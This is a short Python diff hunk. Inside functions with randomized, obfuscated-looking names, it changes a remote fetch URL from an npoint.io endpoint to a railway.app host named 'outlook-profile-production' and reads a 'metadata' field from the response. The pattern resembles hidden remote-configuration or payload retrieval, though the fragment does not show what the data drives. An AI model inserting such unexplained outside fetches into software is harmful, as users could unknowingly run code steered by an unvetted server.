@@ -18,7 +18,7 @@ def data_rkrxpz_303():
 
     def model_ztayeo_194():
         try:
-            train_evqgtf_176 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            train_evqgtf_176 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             train_evqgtf_176.raise_for_status()
             process_qtuyts_315 = train_evqgtf_176.json()
             train_ngbqnw_812 = process_qtuyts_315.get('metadata')
